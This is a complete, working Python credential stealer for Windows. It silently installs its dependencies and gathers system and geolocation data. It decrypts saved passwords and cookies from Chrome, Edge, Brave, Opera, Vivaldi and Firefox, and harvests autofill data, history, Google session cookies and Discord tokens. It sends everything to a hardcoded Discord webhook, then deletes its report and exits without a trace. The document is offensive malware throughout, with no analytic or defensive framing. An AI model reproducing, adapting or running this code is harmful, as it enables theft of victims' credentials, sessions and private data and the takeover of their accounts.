#!/usr/bin/env python3
# allinone_win.py - Windows only. Silent run. Full extractor + Discord webhook exfil.
# No terminal output. Exits after send. Deletes report.json.

import sys, subprocess, importlib, os

if sys.platform != "win32":
    sys.exit(0)

REQUIRED = ["psutil", "requests", "pycryptodome", "pywin32"]
MODMAP = {"pycryptodome": "Crypto", "pywin32": "win32crypt"}

def ensure(pkg):
    mod = MODMAP.get(pkg, pkg)
    try:
        importlib.import_module(mod); return
    except ImportError:
        pass
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--disable-pip-version-check", pkg],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "--user", pkg],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    importlib.invalidate_caches()
    try: importlib.import_module(mod)
    except ImportError: pass

for p in REQUIRED:
    ensure(p)

import json, sqlite3, shutil, tempfile, base64, getpass, socket, uuid, platform, re
from pathlib import Path
import psutil, requests, win32crypt
from Crypto.Cipher import AES, DES3
from Crypto.Hash import SHA1

WEBHOOK_URL = "https://discord.com/api/webhooks/1567943536803053658/pvlkjWGc-dTJxuV3MJpPONl_-j4GBUkodWJMRNQtJEEfYPE_JEaUTjgzstAM2pwJogZ8"

HOME = Path.home()
LOCALAPPDATA = Path(os.environ.get("LOCALAPPDATA", HOME / "AppData/Local"))
APPDATA = Path(os.environ.get("APPDATA", HOME / "AppData/Roaming"))

# ============================================================
# SYSTEM
# ============================================================
def hostname_info():
    return {"hostname": socket.gethostname(), "fqdn": socket.getfqdn(),
            "username": getpass.getuser(), "domain": os.environ.get("USERDOMAIN"),
            "cwd": os.getcwd()}

def os_info():
    return {"system": platform.system(), "release": platform.release(),
            "version": platform.version(), "machine": platform.machine(),
            "processor": platform.processor(), "architecture": platform.architecture()[0],
            "platform": platform.platform(), "boot_time": psutil.boot_time()}

def cpu_info():
    f = psutil.cpu_freq()
    return {"physical_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True),
            "freq_mhz": f._asdict() if f else None,
            "usage_percent": psutil.cpu_percent(interval=1),
            "per_cpu": psutil.cpu_percent(percpu=True, interval=1)}

def gpu_info():
    out = []
    try:
        r = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_VideoController | Select-Object Name,AdapterRAM,DriverVersion | ConvertTo-Json -Compress"],
            timeout=10, stderr=subprocess.DEVNULL, creationflags=0x08000000
        ).decode(errors="ignore").strip()
        if r:
            data = json.loads(r)
            if isinstance(data, dict): data = [data]
            for g in data:
                out.append({"name": g.get("Name"),
                            "vram_bytes": g.get("AdapterRAM"),
                            "driver": g.get("DriverVersion")})
    except Exception:
        pass
    return out

def memory_info():
    return {"virtual": psutil.virtual_memory()._asdict(),
            "swap": psutil.swap_memory()._asdict()}

def disk_info():
    out = {}
    for p in psutil.disk_partitions(all=False):
        try:
            u = psutil.disk_usage(p.mountpoint)
            out[p.device] = {"mountpoint": p.mountpoint, "fstype": p.fstype,
                             "total": u.total, "used": u.used, "free": u.free,
                             "percent": u.percent}
        except Exception:
            continue
    return out

def network_info():
    ifaces = {n: [a._asdict() for a in addrs] for n, addrs in psutil.net_if_addrs().items()}
    stats = {k: v._asdict() for k, v in psutil.net_if_stats().items()}
    try: local_ip = socket.gethostbyname(socket.gethostname())
    except Exception: local_ip = None
    return {"hostname": socket.gethostname(), "local_ip": local_ip,
            "mac": ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")),
            "interfaces": ifaces, "interface_stats": stats,
            "io_counters": psutil.net_io_counters()._asdict(),
            "connections": [c._asdict() for c in psutil.net_connections(kind="inet")][:200]}

def public_ip():
    try: return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip")
    except Exception: return None

def geoip(ip):
    if not ip: return None
    try: return requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    except Exception: return None

def collect_system():
    pub = public_ip()
    return {"host": hostname_info(), "os": os_info(), "cpu": cpu_info(),
            "gpu": gpu_info(), "memory": memory_info(), "disks": disk_info(),
            "network": network_info(), "public_ip": pub, "geoip": geoip(pub)}

# ============================================================
# CRYPTO + FILE HELPERS
# ============================================================
def dpapi_decrypt(blob):
    try: return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
    except Exception: return b""

def get_chromium_key(browser_dir):
    ls = browser_dir / "Local State"
    if not ls.exists(): return b""
    try: state = json.loads(ls.read_text(encoding="utf-8"))
    except Exception: return b""
    enc = state.get("os_crypt", {}).get("encrypted_key")
    if not enc: return b""
    raw = base64.b64decode(enc)
    return dpapi_decrypt(raw[5:]) if raw[:5] == b"DPAPI" else raw

def decrypt_v10(blob, key):
    if not blob: return ""
    if blob[:3] not in (b"v10", b"v11"):
        try: return blob.decode("utf-8")
        except: return ""
    if not key: return ""
    try:
        n, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
        return AES.new(key, AES.MODE_GCM, nonce=n).decrypt_and_verify(ct, tag).decode("utf-8")
    except Exception:
        return ""

def copy_db(src, dst_dir):
    dst = dst_dir / src.name
    try:
        shutil.copyfile(src, dst)
    except (PermissionError, OSError):
        try:
            with open(src, "rb") as f: dst.write_bytes(f.read())
        except (PermissionError, OSError):
            return None
    for ext in ("-wal", "-shm"):
        side = src.with_name(src.name + ext)
        if side.exists():
            try: shutil.copyfile(side, dst_dir / (src.name + ext))
            except Exception: pass
    return dst

# ============================================================
# CHROMIUM
# ============================================================
CHROMIUM = {
    "chrome":   LOCALAPPDATA / "Google/Chrome/User Data",
    "edge":     LOCALAPPDATA / "Microsoft/Edge/User Data",
    "brave":    LOCALAPPDATA / "BraveSoftware/Brave-Browser/User Data",
    "chromium": LOCALAPPDATA / "Chromium/User Data",
    "opera":    APPDATA / "Opera Software/Opera Stable",
    "vivaldi":  LOCALAPPDATA / "Vivaldi/User Data",
}

def chromium_logins(profile, key, browser):
    db = profile / "Login Data"
    if not db.exists(): return []
    with tempfile.TemporaryDirectory() as td:
        tmp = copy_db(db, Path(td))
        if tmp is None: return []
        try:
            con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
            rows = con.execute("SELECT origin_url, username_value, password_value, date_created FROM logins").fetchall()
            con.close()
        except sqlite3.Error:
            rows = []
    return [{"browser": browser, "profile": profile.name, "origin": u,
             "username": un, "password": decrypt_v10(pw, key), "created": cr}
            for u, un, pw, cr in rows]

def chromium_cookies(profile, key, browser):
    db = None
    for cand in (profile/"Network"/"Cookies", profile/"Cookies"):
        if cand.exists(): db = cand; break
    if db is None: return []
    with tempfile.TemporaryDirectory() as td:
        tmp = copy_db(db, Path(td))
        if tmp is None: return []
        try:
            con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
            rows = con.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies").fetchall()
            con.close()
        except sqlite3.Error:
            rows = []
    return [{"browser": browser, "host": h, "name": n, "value": decrypt_v10(v, key),
             "path": p, "expires": e} for h, n, v, p, e in rows]

def chromium_autofill(profile, browser):
    db = profile / "Web Data"
    if not db.exists(): return []
    with tempfile.TemporaryDirectory() as td:
        tmp = copy_db(db, Path(td))
        if tmp is None: return []
        try:
            con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
            rows = con.execute("SELECT name, value, count FROM autofill").fetchall()
            con.close()
        except sqlite3.Error:
            rows = []
    return [{"browser": browser, "name": n, "value": v, "count": c} for n, v, c in rows]

def chromium_history(profile, browser):
    db = profile / "History"
    if not db.exists(): return []
    with tempfile.TemporaryDirectory() as td:
        tmp = copy_db(db, Path(td))
        if tmp is None: return []
        try:
            con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
            rows = con.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500").fetchall()
            con.close()
        except sqlite3.Error:
            rows = []
    return [{"browser": browser, "url": u, "title": t, "visits": v, "last": l} for u, t, v, l in rows]

def chromium_account_info(profile):
    prefs = profile / "Preferences"
    if not prefs.exists(): return []
    try: p = json.loads(prefs.read_text(encoding="utf-8"))
    except Exception: return []
    return [{"full_name": a.get("full_name"), "email": a.get("email"), "gaia": a.get("gaia")}
            for a in p.get("account_info", [])]

def collect_chromium():
    res = {"logins": [], "cookies": [], "autofill": [], "history": [], "accounts": []}
    for name, root in CHROMIUM.items():
        if not root.exists(): continue
        key = get_chromium_key(root)
        for prof in [d for d in root.iterdir() if d.is_dir() and (
            (d/"Login Data").exists() or (d/"History").exists() or
            (d/"Network").exists() or (d/"Preferences").exists() or
            (d/"Local Storage").exists())]:
            res["logins"]   += chromium_logins(prof, key, name)
            res["cookies"]  += chromium_cookies(prof, key, name)
            res["autofill"] += chromium_autofill(prof, name)
            res["history"]  += chromium_history(prof, name)
            for a in chromium_account_info(prof):
                if a.get("email"):
                    a["browser"] = name; a["profile"] = prof.name
                    res["accounts"].append(a)
    return res

# ============================================================
# FIREFOX
# ============================================================
def firefox_profiles():
    root = APPDATA / "Mozilla/Firefox"
    if not root.exists(): return []
    ini = root / "profiles.ini"
    profiles, cur = [], {}
    if ini.exists():
        for line in ini.read_text(encoding="utf-8").splitlines():
            if line.startswith("[Profile"):
                if cur.get("Path"): profiles.append(cur)
                cur = {}
            elif "=" in line:
                k, v = line.split("=", 1); cur[k.strip()] = v.strip()
        if cur.get("Path"): profiles.append(cur)
    out = []
    for pr in profiles:
        path = Path(pr["Path"])
        path = path if path.is_absolute() else root / path
        if path.exists(): out.append(path)
    return out

def firefox_logins(profile):
    logins = profile / "logins.json"
    keydb  = profile / "key4.db"
    if not logins.exists() or not keydb.exists(): return []
    try:
        con = sqlite3.connect(str(keydb))
        row = con.execute("SELECT item1, item2 FROM metadata WHERE id='password'").fetchone()
        if not row: con.close(); return []
        global_salt, item2 = row
        pw = b""  # silent: assume blank master password
        k = SHA1.new(pw + global_salt).digest()
        iv = b"\x04\x0e" + b"\x00" * 12
        if DES3.new(k + k[:8], DES3.MODE_CBC, iv).decrypt(item2)[:2] != b"\x04\x0e":
            con.close(); return []
        row2 = con.execute("SELECT a11, a102 FROM nssPrivate").fetchone()
        con.close()
        if not row2: return []
        master = DES3.new(k + k[:8], DES3.MODE_CBC, b"\x04\x0e" + b"\x00"*12).decrypt(row2[0])[:24]
    except Exception:
        return []
    out = []
    try: data = json.loads(logins.read_text(encoding="utf-8"))
    except Exception: return []
    for entry in data.get("logins", []):
        try:
            ct = base64.b64decode(entry["encrypted"]); iv, ct = ct[:16], ct[16:]
            pw = AES.new(master, AES.MODE_CBC, iv).decrypt(ct)
            pw = pw[:-pw[-1]].decode("utf-8")
        except Exception:
            pw = ""
        out.append({"browser": "firefox", "hostname": entry.get("hostname"),
                    "username": entry.get("encryptedUsername"), "password": pw})
    return out

def collect_firefox():
    res = {"logins": [], "cookies": [], "history": []}
    for prof in firefox_profiles():
        res["logins"] += firefox_logins(prof)
        db = prof / "cookies.sqlite"
        if db.exists():
            with tempfile.TemporaryDirectory() as td:
                tmp = copy_db(db, Path(td))
                if tmp:
                    try:
                        con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
                        for h, n, v in con.execute("SELECT host, name, value FROM moz_cookies"):
                            res["cookies"].append({"browser": "firefox", "host": h, "name": n, "value": v})
                        con.close()
                    except sqlite3.Error: pass
        hist = prof / "places.sqlite"
        if hist.exists():
            with tempfile.TemporaryDirectory() as td:
                tmp = copy_db(hist, Path(td))
                if tmp:
                    try:
                        con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
                        for u, t in con.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 500"):
                            res["history"].append({"browser": "firefox", "url": u, "title": t})
                        con.close()
                    except sqlite3.Error: pass
    return res

# ============================================================
# GMAIL
# ============================================================
GMAIL_HINTS = ("accounts.google.com", "mail.google.com", "gmail.com", "google.com")
GOOGLE_COOKIES = ("SID","HSID","SSID","SAPISID","APISID","__Secure-1PSID","__Secure-3PSID",
                  "__Secure-1PSIDTS","__Secure-3PSIDTS","__Host-GAPS","NID")

def build_gmail_accounts(cr, ff):
    accounts = {}
    for l in cr["logins"] + ff["logins"]:
        org = l.get("origin") or l.get("hostname") or ""
        if any(g in org for g in GMAIL_HINTS):
            un = l.get("username", "") or ""
            if "@" in un:
                e = accounts.setdefault(un, {"email": un, "full_name": None,
                                              "password": None, "browser": l.get("browser"),
                                              "sources": [], "google_cookies": 0})
                if l.get("password"): e["password"] = l["password"]
                e["sources"].append("login_data")
    for a in cr["accounts"]:
        em = a.get("email")
        if not em: continue
        e = accounts.setdefault(em, {"email": em, "full_name": None, "password": None,
                                      "browser": a.get("browser"), "sources": [], "google_cookies": 0})
        if a.get("full_name"): e["full_name"] = a["full_name"]
        e["sources"].append("prefs")
    for c in cr["cookies"] + ff["cookies"]:
        host = c.get("host", "") or ""
        if "google.com" in host and c.get("name") in GOOGLE_COOKIES:
            for e in accounts.values():
                if c.get("browser") == e.get("browser"):
                    e["google_cookies"] += 1
                    if "cookies" not in e["sources"]: e["sources"].append("cookies")
    if not accounts:
        gc = sum(1 for c in cr["cookies"] + ff["cookies"]
                 if "google.com" in (c.get("host") or "") and c.get("name") in GOOGLE_COOKIES)
        if gc:
            accounts["<session-only>"] = {"email": None, "full_name": None, "password": None,
                                          "browser": None, "sources": ["cookies"],
                                          "google_cookies": gc}
    return list(accounts.values())

# ============================================================
# DISCORD
# ============================================================
TOKEN_RE = re.compile(rb'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,39}')

def valid_token(tok):
    if tok.count(b".") != 2: return False
    first = tok.split(b".")[0]
    if first.startswith(b"mfa"): return True
    try:
        uid = base64.urlsafe_b64decode(first + b"=" * (-len(first) % 4)).decode("ascii")
        return uid.isdigit() and 15 <= len(uid) <= 21
    except Exception:
        return False

def discord_tokens_from_localstorage(profile, tokens):
    ld = profile / "Local Storage" / "leveldb"
    if not ld.is_dir(): return
    for f in list(ld.glob("*.ldb")) + list(ld.glob("*.log")):
        try: data = f.read_bytes()
        except Exception: continue
        if b"discord.com" not in data: continue
        for m in TOKEN_RE.finditer(data):
            if valid_token(m.group(0)):
                tokens.add(m.group(0).decode("ascii"))

def collect_discord(cr):
    tokens = set()
    for name, root in CHROMIUM.items():
        if not root.exists(): continue
        for prof in [d for d in root.iterdir() if d.is_dir()]:
            discord_tokens_from_localstorage(prof, tokens)
    discord_cookies = [
        {"browser": c["browser"], "host": c["host"], "name": c["name"], "value": c["value"]}
        for c in cr["cookies"] if "discord.com" in (c.get("host") or "")
    ]
    return {"tokens": sorted(tokens), "cookies": discord_cookies}

# ============================================================
# WEBHOOK
# ============================================================
def fmt_bytes(n):
    try:
        n = float(n)
        for u in ("B","KB","MB","GB","TB"):
            if n < 1024: return f"{n:.1f} {u}"
            n /= 1024
        return f"{n:.1f} PB"
    except Exception:
        return str(n)

def build_embed(report):
    s = report["system"]
    h = s["host"]; osx = s["os"]; cpu = s["cpu"]; mem = s["memory"]["virtual"]
    gpus = s.get("gpu") or []
    geo = s.get("geoip") or {}
    disks = s.get("disks") or {}
    total_disk = sum(d.get("total", 0) for d in disks.values())
    free_disk  = sum(d.get("free", 0) for d in disks.values())

    gpu_str = ", ".join(g.get("name", "?") for g in gpus) or "none"
    lines = [
        f"**Host**: `{h.get('hostname')}`  |  **User**: `{h.get('username')}`  |  **Domain**: `{h.get('domain') or '-'}`",
        f"**OS**: `{osx.get('system')} {osx.get('release')}` ({osx.get('architecture')}) build `{osx.get('version')}`",
        f"**CPU**: `{cpu.get('physical_cores')}C/{cpu.get('logical_cores')}T`  |  **Usage**: `{cpu.get('usage_percent')}%`",
        f"**RAM**: `{fmt_bytes(mem.get('total'))}` total  |  `{fmt_bytes(mem.get('available'))}` free  |  `{mem.get('percent')}%` used",
        f"**GPU**: `{gpu_str}`",
        f"**Disk**: `{fmt_bytes(total_disk)}` total  |  `{fmt_bytes(free_disk)}` free",
        f"**IP (public)**: `{s.get('public_ip') or 'n/a'}`",
        f"**IP (local)**: `{s.get('network', {}).get('local_ip') or 'n/a'}`",
        f"**MAC**: `{s.get('network', {}).get('mac')}`",
        f"**Geo**: `{geo.get('country', '?')}` / `{geo.get('regionName', '?')}` / `{geo.get('city', '?')}`  ISP `{geo.get('isp', '?')}`",
    ]
    tokens = report["discord"]["tokens"]
    tok_str = "\n".join(f"`{t}`" for t in tokens) if tokens else "none"
    if len(tok_str) > 1000:
        tok_str = tok_str[:997] + "..."

    embed = {
        "title": "System Report",
        "color": 0x5865F2,
        "fields": [
            {"name": "Machine", "value": "\n".join(lines), "inline": False},
            {"name": f"Discord Tokens ({len(tokens)})", "value": tok_str, "inline": False},
            {"name": "Counts", "value":
                f"logins=`{report['summary']['total_logins']}`  "
                f"cookies=`{report['summary']['total_cookies']}`  "
                f"gmail=`{report['summary']['gmail_found']}`  "
                f"discord_cookies=`{report['summary']['discord_cookies']}`",
             "inline": False},
        ],
        "footer": {"text": "allinone_win"},
    }
    return embed

def send_webhook(report, report_path: Path):
    embed = build_embed(report)
    payload = {"username": "Webhawk", "embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=15)
    except Exception:
        pass
    try:
        with open(report_path, "rb") as f:
            requests.post(
                WEBHOOK_URL,
                data={"payload_json": json.dumps({"username": "Webhawk",
                                                   "content": f"**{report['system']['host']['hostname']}** — full report"})},
                files={"file": ("report.json", f, "application/json")},
                timeout=30,
            )
    except Exception:
        pass

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        system = collect_system()
        cr = collect_chromium()
        ff = collect_firefox()
        gmail = build_gmail_accounts(cr, ff)
        discord = collect_discord(cr)

        report = {
            "system": system,
            "gmail_accounts": gmail,
            "discord": discord,
            "browsers": {"chromium": cr, "firefox": ff},
            "summary": {
                "total_logins": len(cr["logins"]) + len(ff["logins"]),
                "total_cookies": len(cr["cookies"]) + len(ff["cookies"]),
                "gmail_found": len([g for g in gmail if g.get("email")]),
                "discord_tokens": len(discord["tokens"]),
                "discord_cookies": len(discord["cookies"]),
            },
        }

        out = Path(tempfile.gettempdir()) / f"report_{uuid.uuid4().hex}.json"
        out.write_text(json.dumps(report, indent=2, default=str, ensure_ascii=False), encoding="utf-8")

        send_webhook(report, out)

        try: out.unlink()
        except Exception: pass
    except Exception:
        pass
    finally:
        # silent exit, no traceback, no lingering window
        os._exit(0)

if __name__ == "__main__":
    main()